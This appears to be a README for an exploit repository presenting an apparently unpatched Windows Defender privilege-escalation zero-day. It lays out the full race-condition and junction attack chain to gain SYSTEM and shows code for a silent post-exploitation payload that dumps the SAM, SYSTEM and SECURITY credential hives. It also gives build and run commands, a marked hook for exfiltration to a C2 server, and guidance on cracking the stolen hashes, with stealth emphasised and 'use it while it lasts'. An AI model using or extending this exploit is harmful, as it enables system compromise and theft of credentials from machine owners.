# ☀️ Burning Sun — Windows Defender Privilege Escalation Zero-DAY 

> **⚠️ DISCLAIMER: This project is strictly for educational and authorized security research purposes only. Unauthorized use of this code against systems you do not own or have explicit permission to test is illegal and unethical. The author is not responsible for any misuse.**

---

## 📖 Overview

This repository contains a Proof of Concept (PoC) demonstrating a **privilege escalation vulnerability** in the Windows Defender signature update pipeline. The exploit leverages a **race condition** during Windows Defender's real-time protection response to achieve **arbitrary file write to `C:\Windows\System32`**, ultimately escalating privileges to **NT AUTHORITY\SYSTEM**.

The attack chain abuses several legitimate Windows subsystems in combination:

- **Windows Cloud Files API (`cldapi.dll`)** — Cloud sync provider placeholder creation  
- **NTFS Opportunistic Locks (OpLocks)** — File operation synchronization/stalling  
- **NTFS Junction Points (Reparse Points)** — Directory redirection to `System32`  
- **Volume Shadow Copy (VSS) detection** — Monitoring AV-triggered shadow copies via the Object Manager  
- **Windows Storage Tiering Engine Service** — COM activation for SYSTEM-level code execution  

> [!CAUTION]
> **Zero-Day Status:** As of the time of writing, this vulnerability is **unpatched** and works against the latest Windows 10/11 builds with up-to-date Defender definitions. Since this is a **0-day**, Microsoft may patch it at any time through a Windows Update, Defender definition update, or platform security change. If the exploit stops working after an update, it likely means the race condition window has been closed or the Tiering Engine service loading behavior has been hardened. **There is no guarantee of longevity — use it while it lasts.**

---

## 📁 File Structure

| File | Description |
|------|-------------|
| `source.cpp` | **Original PoC** — The reference implementation that inspired this work. Contains the core exploit logic but ships with multiple compilation errors, duplicated functions, MSVC-only directives, and spawns a visible `conhost.exe` shell upon SYSTEM elevation. **Does not compile with GCC/MinGW without significant fixes.** |
| `hello_fixed.cpp` | **Improved PoC** — Completely reworked version that compiles cleanly under both MinGW and MSVC. Removes the visible shell popup entirely, replaces it with silent automated registry hive extraction (SAM, SYSTEM, SECURITY), and provides a clean extension point for user-defined exfiltration logic. |

---

## 🔬 How It Works

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│  1. Create named pipe (\\.\pipe\REDSUN) as instance lock    │
│  2. Create temp working directory (%TEMP%\RS-{GUID})        │
│  3. Write reversed EICAR test string to bait file           │
│     (TieringEngineService.exe in temp dir)                  │
│  4. Trigger Defender RTP scan via FILE_EXECUTE access       │
│  5. Shadow Copy Finder thread detects new VSS volume        │
│  6. Acquire Batch OpLock on VSS copy of bait file           │
│  7. Delete original bait, replace with Cloud Files          │
│     placeholder via CF API                                  │
│  8. Rename + delete-on-close the working directory          │
│  9. Re-create directory as NTFS junction → System32         │
│ 10. Race Defender's file restoration into System32          │
│ 11. Overwrite TieringEngineService.exe in System32          │
│ 12. Copy self to System32 & trigger COM activation          │
│ 13. Service starts as NT AUTHORITY\SYSTEM                   │
│ 14. On SYSTEM context: dump SAM/SYSTEM/SECURITY hives      │
└─────────────────────────────────────────────────────────────┘
```

### Key Techniques

1. **EICAR Bait** — A reversed [EICAR test string](https://en.wikipedia.org/wiki/EICAR_test_file) is written to disk, then opened with `FILE_EXECUTE` to reliably trigger Windows Defender's Real-Time Protection scan.

2. **VSS Race Detection** — A background thread continuously polls the NT Object Manager's `\Device` directory for newly created `HarddiskVolumeShadowCopy*` entries, detecting when Defender triggers a Volume Shadow Copy during remediation.

3. **OpLock Stalling** — Batch OpLocks (`FSCTL_REQUEST_BATCH_OPLOCK`) are placed on both the shadow copy and the recreated placeholder file to stall Defender's file operations at critical moments, creating the race window.

4. **Junction Point Redirect** — The working directory is deleted and recreated as an NTFS mount point (junction) targeting `C:\Windows\System32`, causing Defender's file restoration to write into a privileged directory.

5. **COM Service Hijack** — The Storage Tiering Management Engine (`{50d185b9-fff3-4656-92c7-e4018da4361d}`) is activated via `CoCreateInstance` with `CLSCTX_LOCAL_SERVER`, which loads the planted `TieringEngineService.exe` from System32 under **NT AUTHORITY\SYSTEM** context.

---

## 🐛 Bugs & Compilation Errors in `source.cpp`

The original PoC (`source.cpp`) contains several issues that **prevent it from compiling with GCC/MinGW** and introduce runtime bugs even under MSVC:

### 1. Duplicated Function Definitions

```cpp
// source.cpp defines these TWICE (lines 414-583 AND lines 586-755):
HANDLE gevent = CreateEvent(NULL, FALSE, NULL, NULL);  // ← defined twice
DWORD WINAPI ShadowCopyFinderThread(wchar_t* foo)      // ← defined twice
```

The entire `ShadowCopyFinderThread` function and `gevent` global are **copy-pasted twice** in the source file. This causes immediate `multiple definition` linker errors on any compiler.

### 2. Undefined Function Pointers

The shadow copy thread references function pointers that are **never declared or initialized**:

```cpp
// source.cpp lines 572, 574 — these symbols don't exist anywhere:
if (_GetOverlappedResult) _GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);
if (_WaitForSingleObject) _WaitForSingleObject(gevent, INFINITE);
```

`_GetOverlappedResult` and `_WaitForSingleObject` are used as if they're dynamically resolved function pointers, but they're **never defined, declared, or loaded via `GetProcAddress`**. This causes `undeclared identifier` errors during compilation.

### 3. MSVC-Only `#pragma comment(lib, ...)`

```cpp
// source.cpp lines 12-15 — GCC/MinGW ignores these entirely:
#pragma comment(lib,"synchronization.lib")
#pragma comment(lib,"sas.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"CldApi.lib")
```

These MSVC-specific directives do nothing under GCC. When compiling with MinGW, you must manually pass `-lntdll -lole32` etc. on the command line. The original provides no guidance for this.

### 4. Missing `UNICODE` / `_UNICODE` Defines

The original file does **not** define `UNICODE` or `_UNICODE` at the top. This means all Win32 `W`-suffix functions (wide string variants) may not resolve correctly depending on the compiler's default charset mode. Under MinGW specifically, this causes mismatched function signatures when using `CreateFileW`, `CreateDirectoryW`, etc. alongside the generic `CreateFile` macros.

### 5. `FILE_RENAME_INFORMATION` Redefinition

```cpp
// source.cpp lines 22-34 — manually redefines a Windows SDK struct:
typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, * PFILE_RENAME_INFORMATION;
```

This struct is **already defined** in `<winternl.h>` / Windows SDK headers. Redefining it causes `redefinition of 'FILE_RENAME_INFORMATION'` errors under MinGW which pulls in the SDK definition automatically.

### 6. `NULL` Used Where Integer `0` Is Expected

Throughout the original, `NULL` is passed to Win32 functions where a numeric `0` is expected:

```cpp
// source.cpp uses NULL for integer parameters — GCC warns/errors on these:
stat = NtCreateFile(&hrp, ..., NULL, FILE_SHARE_READ | ..., FILE_OPEN_IF, ...);
//                           ^^^^ FileAttributes expects ULONG, not pointer

rdb->Reserved = NULL;  // USHORT = NULL → truncation warning
rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;  // same issue
HeapFree(GetProcessHeap(), NULL, rdb);  // DWORD flags = NULL
```

GCC with `-Wall` treats these as `int-to-pointer` or `pointer-to-int` conversion warnings, and with stricter settings they become hard errors.

### 7. Memory Leak in `FILE_RENAME_INFORMATION`

```cpp
// source.cpp line 1027 — allocates pfri but never calls free():
PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(...);
// ... used ...
// ← missing free(pfri) before scope exit
```

The `pfri` allocation inside the rename block is never freed. Our version adds `free(pfri)` after use.

### 8. No Error Handling on `CopyFileW`

```cpp
// source.cpp line 1107 — fires and forgets:
CopyFileW(mx, mx2, FALSE);
LaunchTierManagementEng();
```

The original doesn't check whether the self-copy to System32 actually succeeded before triggering the COM service. If the copy fails, the service launch will load stale/wrong code. Our version checks the return value and only triggers the service on success.

---

## 🔇 Shell Popup Removal — Stealth Automation

The most significant behavioral change between the original and our version is **what happens after achieving SYSTEM privileges**.

### Original Behavior (`source.cpp`)

Upon successful privilege escalation, the original PoC calls `LaunchConsoleInSessionId()`:

```cpp
// source.cpp lines 847-885
void LaunchConsoleInSessionId()
{
    // Reads the session ID from the named pipe server
    HANDLE hpipe = CreateFileW(L"\\??\\pipe\\REDSUN", ...);
    DWORD sessionid = 0;
    GetNamedPipeServerSessionId(hpipe, &sessionid);
    
    // Duplicates the SYSTEM token with the user's session ID
    DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, ..., &hnewtoken);
    SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, ...);
    
    // Spawns a VISIBLE conhost.exe shell as SYSTEM in the user's session
    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", ...);
}
```

This approach has a critical **OPSEC problem**: it **spawns a visible console window** (`conhost.exe`) on the user's desktop running as `NT AUTHORITY\SYSTEM`. This is:
- 🔴 **Immediately visible** to anyone watching the screen
- 🔴 **Logged** by endpoint detection as an anomalous SYSTEM-owned interactive process
- 🔴 **Manual** — requires the operator to type further commands in the shell

### Our Behavior (`hello_fixed.cpp`)

We completely **removed** the `LaunchConsoleInSessionId()` function and replaced it with **silent, automated post-exploitation**:

```cpp
// hello_fixed.cpp lines 830-843
if (ret) {  // ret = true when running as NT AUTHORITY\SYSTEM
    LogToFile(L"--- RESEARCH POC: SYSTEM PRIVILEGES ATTAINED ---");
    
    // Enable SeBackupPrivilege to read protected registry hives
    EnablePrivilege(L"SeBackupPrivilege");
    
    // Silently dump all three credential hives
    SaveHive(HKEY_LOCAL_MACHINE, L"SAM",      L"C:\\Windows\\System32\\sam.hiv");
    SaveHive(HKEY_LOCAL_MACHINE, L"SYSTEM",   L"C:\\Windows\\System32\\system.hiv");
    SaveHive(HKEY_LOCAL_MACHINE, L"SECURITY", L"C:\\Windows\\System32\\security.hiv");
    
    ExitProcess(0);  // Clean exit, no visible artifacts
}
```

**Key design decisions:**

1. **No visible window** — Zero GUI artifacts. The process runs, dumps, and exits silently.
2. **`SeBackupPrivilege`** — Explicitly enabled before `RegSaveKeyExW` calls, which is required to read the SAM and SECURITY hives even as SYSTEM.
3. **Atomic hive dump** — Uses `RegSaveKeyExW` with `REG_LATEST_FORMAT` for the cleanest possible binary export.
4. **Diagnostic logging** — All operations log to `%TEMP%\poc_research.log` for post-mortem analysis without console output.

---

## 📤 Exfiltration — Bring Your Own Logic

The hive extraction in `hello_fixed.cpp` is deliberately **local-only**. The files are saved to `C:\Windows\System32\` as `.hiv` files, ready for retrieval. This is an intentional design choice — **exfiltration logic is left as an exercise for the researcher**.

### Where to Hook In

After the `SaveHive()` calls in `IsRunningAsLocalSystem()` (line ~841), you can add your own exfiltration before `ExitProcess(0)`:

```cpp
// After hive dumps complete, add your logic here:
SaveHive(HKEY_LOCAL_MACHINE, L"SAM",      L"C:\\Windows\\System32\\sam.hiv");
SaveHive(HKEY_LOCAL_MACHINE, L"SYSTEM",   L"C:\\Windows\\System32\\system.hiv");
SaveHive(HKEY_LOCAL_MACHINE, L"SECURITY", L"C:\\Windows\\System32\\security.hiv");

// ─── YOUR EXFILTRATION LOGIC HERE ───
// Examples:
//   • HTTP POST to a C2 endpoint (WinHTTP / WinINet)
//   • SMB copy to a network share
//   • Encrypt + stage to a cloud storage blob
//   • Compress with RtlCompressBuffer (ntdll) and write to USB
// ─────────────────────────────────────

ExitProcess(0);
```

### What the Hives Contain

| Hive | Why It Matters |
|------|----------------|
| **SAM** | Contains NTLM password hashes for all local accounts. Can be cracked offline with `hashcat`/`john` or used in pass-the-hash attacks. |
| **SYSTEM** | Contains the `SYSTEM` boot key needed to decrypt the SAM hashes, plus LSA secrets encryption keys and service account credentials. |
| **SECURITY** | Contains cached domain logon credentials (DCC2 hashes), LSA policies, and security audit configuration. |

> **Note:** You need both `SAM` + `SYSTEM` together to extract usable password hashes. Tools like `secretsdump.py` (Impacket), `mimikatz`, or `samdump2` can parse these offline.

---

## 🔧 Full Comparison: `Red-Sun.cpp` vs `Burning-Sun.cpp`

| Aspect | `Red-Sun.cpp` (Original) | `Burning-Sun` (Improved) |
|--------|------------------------|------------------------------|
| **Compiles with GCC/MinGW** | ❌ No — multiple errors (see above) | ✅ Yes — compiles cleanly with `-municode` |
| **Duplicated Functions** | `ShadowCopyFinderThread` + `gevent` defined twice | Single, clean implementation |
| **Undefined Symbols** | References `_GetOverlappedResult`, `_WaitForSingleObject` (never declared) | Uses standard `GetOverlappedResult`, `WaitForSingleObject` directly |
| **MSVC-Only Directives** | `#pragma comment(lib, ...)` — ignored by GCC | Removed; libraries specified via compiler flags |
| **`UNICODE` Defines** | Missing `#define UNICODE` / `_UNICODE` | Properly defined at file top |
| **Struct Redefinition** | Redefines `FILE_RENAME_INFORMATION` (conflicts with SDK) | Removed; uses SDK-provided definition |
| **NULL vs 0** | Uses `NULL` for integer params (truncation warnings) | Uses `0` where integer is expected |
| **SYSTEM Payload** | Spawns **visible** `conhost.exe` shell on desktop | **Silent** automated hive dump — no GUI |
| **Synchronization** | `WaitOnAddress`/`WakeByAddressAll` with race potential | `SetEvent`/`WaitForSingleObject` with proper 2-stage signaling |
| **Retry Logic** | Infinite retry on `STATUS_NO_SUCH_DEVICE` (can hang forever) | Bounded `RETRY_MAX_COUNT` with configurable sleep intervals |
| **Resource Cleanup** | Leaks handles, memory (`pfri`), and named pipe on error | `CleanupGlobalSync()`, `free(pfri)`, proper cleanup on all paths |
| **Configuration** | Magic numbers (`120000`, `20`, `2000`) scattered in code | Named constants: `AV_TIMEOUT_MS`, `RETRY_SLEEP_MS`, `RETRY_MAX_COUNT` |
| **VSS Buffer Safety** | No bounds checking on `Name.Length` before `memmove` | Added `MAX_PATH` validation before buffer copies |
| **Thread Safety** | Bare global event, no CRITICAL_SECTION | `CRITICAL_SECTION` + managed `InitGlobalSync()`/`CleanupGlobalSync()` |
| **Self-Deploy Check** | Always runs full exploit chain | Detects prior deployment to System32, skips directly to trigger |
| **CopyFile Error Handling** | Fire-and-forget `CopyFileW()` | Checks return value, only triggers service on success |
| **Logging** | `printf` only | File-based `LogToFile()` to `%TEMP%\poc_research.log` + selective `printf` |

---

## 🛠️ Build Instructions

### Prerequisites

- **MinGW-w64** (cross-compilation) or **MSVC** (Visual Studio)
- Windows SDK headers (`winternl.h`, `ntstatus.h`)
- Target: **Windows 10/11** with Defender Real-Time Protection **enabled**

### Compile with MinGW (x86_64)

```bash
x86_64-w64-mingw32-g++ -o hello_fixed.exe hello_fixed.cpp \
    -lole32 -luuid -lntdll -ladvapi32 \
    -static -municode -O2
```

### Compile with MSVC

```powershell
cl /EHsc /O2 hello_fixed.cpp ole32.lib uuid.lib ntdll.lib advapi32.lib
```

---

## 🚀 Usage

> **Requires:** Administrator privileges and Windows Defender Real-Time Protection must be **enabled**.

```powershell
# Run from an elevated command prompt
.\hello_fixed.exe
```

### Expected Output (Successful)

```
Solar forge: C:\Users\...\AppData\Local\Temp\RS-{GUID}
The sun is shining...
Casting a solar flare...
Solar flare holding...
Signaling sunrise...
Aligning solar orbit...
Releasing coronal mass...
The sun burns bright...
The burning sun shall prevail.
The sun has been planted in the sky.
The sun now rules the kingdom.
The harvest is complete.
Nothing is hidden from the sun.
```

### Extracted Artifacts

Upon SYSTEM elevation, the following registry hives are saved:

| File | Contents |
|------|----------|
| `C:\Windows\System32\sam.hiv` | SAM database (local user password hashes) |
| `C:\Windows\System32\system.hiv` | SYSTEM hive (boot config, LSA secrets key) |
| `C:\Windows\System32\security.hiv` | SECURITY hive (LSA policies, cached credentials) |

---

## 🧪 Testing Environment

- Run inside a **Virtual Machine** (VMware, Hyper-V, VirtualBox)
- Use a **snapshot** to revert after testing
- Ensure Defender definitions are reasonably current
- Monitor with **Process Monitor** and **DebugView** for diagnostics

---

## 📚 References & Prior Art

- [EICAR Anti-Virus Test File](https://www.eicar.org/download-anti-malware-testfile/)
- [Windows Cloud Files API Documentation](https://learn.microsoft.com/en-us/windows/win32/cfapi/)
- [Opportunistic Locks (MSDN)](https://learn.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks)
- [NTFS Reparse Points](https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points)
- [Storage Tiering Management Engine](https://learn.microsoft.com/en-us/windows-server/storage/data-deduplication/overview)

---

## ⚖️ Legal

This tool is provided **as-is** for **educational purposes** and **authorized penetration testing only**. Usage of this software to attack targets without prior mutual consent is **illegal**. It is the end user's responsibility to comply with all applicable local, state, and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.

---

## 📝 License

This project is released for educational and research purposes. No warranty is provided.
